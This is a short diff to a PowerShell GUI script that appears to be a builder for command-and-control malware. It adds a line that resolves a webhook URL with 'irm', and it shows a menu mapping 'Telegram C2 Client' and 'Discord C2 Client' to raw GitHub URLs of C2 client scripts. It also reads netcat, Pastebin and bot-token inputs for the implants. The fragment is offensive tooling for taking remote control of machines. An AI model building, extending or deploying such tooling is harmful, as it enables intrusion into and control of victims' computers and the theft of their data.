@@ -212,7 +212,8 @@ $startButton.Add_Click({
     $ghurl = $PastebinInput.Text
     $tg = $TGTokenInput.Text
     $NCurl = $netcatInput.Text
-
+    if ($hookurl.Ln -ne 121){$hookurl = (irm $hookurl).url}
+    
     switch ($selectedItem) {
         "Telegram C2 Client"       {$url = "https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1"}
         "Discord C2 Client"        {$url = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1"}
